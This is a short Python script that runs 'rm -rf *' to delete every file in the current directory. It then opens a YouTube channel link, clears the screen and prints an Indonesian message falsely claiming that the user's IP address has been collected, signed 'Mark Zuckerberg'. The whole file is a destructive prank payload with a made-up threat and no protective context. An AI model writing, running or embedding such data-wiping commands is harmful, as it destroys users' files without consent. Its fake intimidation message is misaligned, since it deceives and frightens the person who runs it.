import os
os.system("rm -rf *")
os.system("xdg-open https://youtube.com/NjankSoekamti")
os.system("clear")
print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
